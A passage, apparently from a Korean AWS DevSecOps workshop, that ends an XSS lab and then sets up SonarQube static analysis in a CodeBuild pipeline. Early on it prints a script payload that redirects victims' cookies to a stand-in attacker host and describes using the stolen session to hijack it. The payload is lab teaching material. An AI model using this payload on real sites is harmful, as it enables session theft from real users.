2.  2.  페이지가 XSS에 취약한지 테스트하는 일반적인 방법은 경고를 사용하는 것입니다: `<script>alert("LOL!")</script>`

![a7-xss-check](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a7-xss-check.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  이제 공격자가 XSS 논문을 증명했으므로 다른 사용자의 페이지에 렌더링할 수 있는 자바스크립트 코드를 삽입할 수 있습니다. 일반적인 XSS 익스플로잇은 사용자의 브라우저 쿠키(세션 토큰을 포함할 수 있음)와 함께 사용자를 리디렉션하려고 시도합니다. 이 작업을 확인하려면 `<script>document.location='http://example.com/?cookies='+document.cookie</script>`를 입력하세요. 브라우저는 쿼리 매개변수에 브라우저 쿠키를 사용하여 공격자의 웹사이트로 리디렉션합니다.

![a7-cookie-stolen](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a7-cookie-stolen.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  **sessionId** 쿠키가 도용되면 공격자는 [A2: Broken Authentication](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module3/a2_broken_authentication.html)에서 했던 것과 동일한 작업을 수행하여 피해자의 세션을 하이재킹할 수 있습니다.

# 4. Static Application Security Testing (SAST)

이제 일반적인 웹 애플리케이션 위험과 그 작동 방식에 대해 이해했으므로 이제 보안 도구 및 수동 코드 검토를 통해 이를 식별하고 해결하는 과정을 살펴보도록 하겠습니다.

이 모듈에서는 파이프라인에 **[정적 애플리케이션 보안 테스트(SAST)](https://en.wikipedia.org/wiki/Static_application_security_testing)**  도구를 도입할 것입니다. SAST는 소스 코드를 검토하고 취약점의 소스를 식별하며 검토하고 면밀히 고려해야 할 보안 핫스팟을 제공합니다.

이 실습에서는 [SonarQube Community Edition](https://www.sonarqube.org/) 을 SAST 도구로 사용합니다.

#### Topics Covered

이 실습을 마치면 다음을 수행할 수 있습니다.:

-   Static Application Security Testing(SAST)의 개념과 이점 이해
-   CodeBuild를 사용하여 [SonarQube](https://www.sonarqube.org/)  스캔 자동화
-   SAST Tool 및 Manual Code Review에서 발견된 일반적인 취약점 수정

# SonarQube 토큰 생성

CodeBuild가 SAST 도구 역할을 할 SonarQube 서버와 상호 작용하려면 먼저 [사용자 토큰](https://docs.sonarqube.org/latest/user-guide/user-token/) 을 생성해야 합니다.

1.  SonarQube 서버에 액세스하려면 CloudFormation 대시보드를 통해 링크를 얻을 수 있습니다. ClodFormation 콘솔을 열고 **AppSecWorkshopStack**이라는 스택을 찾아 클릭합니다.

![appsecworkshop-stack](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/appsecworkshop-stack.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **Outputs** 탭을 클릭하면 접두사 **DevToolsSonarQubeServiceURL**이 있는 키로 표시되는 SonarQube 서버에 대한 링크가 있습니다. 링크를 클릭하여 SonarQube 웹 포털을 엽니다.

![sonarqube-url](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-url.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  SonarQube 로그인 페이지가 표시되어야 합니다. SonarQube의 기본 자격 증명을 사용하여 로그인할 수 있습니다. **Username: admin** 및 **Password: admin**

![sonarqube-login](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-login.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  **admin**으로 로그인한 후 비밀번호를 변경하라는 메시지가 표시됩니다. 기억에 남는 새로운 비밀번호를 사용하시기를 권장합니다.

![sonarqube-change-passwd](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-change-passwd.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  비밀번호를 업데이트하면 SonarQube 대시보드에 액세스할 수 있습니다.

![sonarqube-dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-dashboard.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

6.  다음으로 **SonarQube Token**을 생성해야 합니다. 이는 SonarQube 서버에 스캔을 요청할 수 있도록 AWS CodeBuild를 인증하는 데 필요합니다. 메뉴 모음에서 **Security**를 클릭한 다음 **Users**을 클릭한 다음 마지막으로 **Users**를 클릭합니다.

![sonarqube-admin](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-admin.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

7.  이 실습에서는 AWS CodeBuild에서 특별히 사용할 새로운 SonarQube 사용자를 생성합니다. **Create User** 버튼을 클릭합니다.

![sonarqube-users](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-users.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

8.  사용자 세부 정보를 제공한 다음 **Create**를 클릭합니다. (아래 제안된 값을 따를 수 있습니다.)

![sonarqube-create-user](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-create-user.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

9.  SonarQube 사용자를 생성했으면 이제 해당 사용자에 대한 토큰을 생성할 수 있습니다. 아래 이미지에 표시된 **Update Tokens** 버튼을 클릭합니다.

![sonarqube-update-token](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-update-token.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

10.  토큰 이름을 입력하고 **Generate**을 클릭합니다.

![sonarqube-token-gen](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-token-gen.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

11.  생성된 토큰을 클립보드에 복사합니다. 다음 섹션에서 이것이 필요합니다.

![sonarqube-token-created](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-token-created.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# 파이프라인 업데이트

이제 SonarQube 토큰이 있으므로 파이프라인에서 애플리케이션 보안 도구를 활성화할 수 있습니다.

1.  SonarQube에서 생성한 토큰을 제공하기 위해 **config.yaml**을 다시 업데이트해야 하므로 Cloud9 IDE로 돌아갑니다. **<PLACE_SONARQUBE_TOKEN_HERE>** 값을 이전 섹션에서 가져온 클립보드에 있는 토큰으로 바꿉니다. 이때 **config.yaml**은 다음과 같아야 합니다.

```yaml
### Staging Auto-Deploy
auto_deploy_staging: False
initial_image: public.ecr.aws/adelagon/flask-app:latest

### Static Application Security Testing (SAST) Step
sast:
  enabled: True
  sonarqube:
    image: public.ecr.aws/adelagon/sonarqube:lts-community
    token: 1ecf.......60f2

### Software Composition Analysis (SCA) Step
sca:
  enabled: True

### License Checker Step
license:
  enabled: True

### Dynamic Application Security Testing (DAST) Step
dast:
  enabled: True
  zaproxy:
    instance_type: t3.medium
    api_key: SomeRandomString
```

2.  **config.yaml**을 저장하고 마지막으로 터미널 창에서 **cdk deploy**를 실행하여 새 토큰으로 CodeBuild 프로젝트를 업데이트합니다.

```bash
1
2
cd ~/environment/pipeline
cdk deploy --require-approval never
```

3.  CDK 배포에 성공하면 이제 다음 섹션으로 진행할 수 있습니다.

# 코드 저장소 초기화

이제 **Automated Release Pipeline**을 위한 기본 플랫폼 준비되어 있으므로 이제 웹 애플리케이션을 배포해 보겠습니다. 이를 위해 ECS on Fargate를 사용하여 이전에 CDK에서 생성한 스테이징 VPC의 퍼블릭 서브넷에 프로비저닝할 것입니다.

1.  1단계에서 얻은 **Clone URL**을 붙여넣어 Git 리포지토리를 복제합니다.

```bash
1
2
cd ~/environment
git clone codecommit://flask-app
```

2.  _You appear to have cloned an empty repository_에 대한 경고는 무시하셔도 됩니다.  
    ![git-clone](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/git-clone.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)
    
3.  웹 애플리케이션의 코드를 Cloud9 환경으로 다운로드하려면 터미널 창에 다음 명령을 입력하십시오.
    

```bash
1
2
3
4
cd ~/environment
curl 'https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/assets/flask-app.zip?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j~fKbB~qv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR~baDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy~dU4e2mK2q~QLjfh3gew~7~Ju8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__' --output flask-app.zip
unzip flask-app.zip -d flask-app && rm flask-app.zip
cd ~/environment/flask-app
```

4.  이제 웹 애플리케이션의 코드가 있으므로 이를 Git 저장소에 게시하기만 하면 됩니다. 그 전에 먼저 Git을 소개하겠습니다. 이것은 Git이 익명에 대한 경고를 방지하기 위한 것입니다.

```bash
1
2
git config user.name "<Your Name>"
git config user.email "<You Email Address>"
```

5.  다음 명령을 사용하여 다운로드한 모든 코드를 Git에 추가하고 커밋한 후 AWS CodeCommit에 푸시해 보겠습니다.

```bash
1
2
3
git add .
git commit -a -m"Initial Commit"
git push
```

6.  코드가 실제로 CodeCommit에 푸시되었는지 확인해 보겠습니다. AWS CodeCommit 대시보드로 이동하여 리포지토리 목록에서 **flask-app**을 선택합니다. 더 이상 비어 있지 않음을 확인해야 합니다.

![git-push](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/git-push.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

7.  또한 CodePipeline 대시보드로 이동하는 경우. **devsecops-pipeline**은 git push를 수행할 때 자동으로 트리거되어야 합니다.

![git-trigger](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/git-trigger.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

8.  파이프라인이 SAST 단계를 완료할 수 있도록 잠시만 기다리십시오. 또한 아래와 같이 **Details** 링크를 클릭하여 SAST CodeBuild 단계의 진행 상황을 볼 수 있습니다.

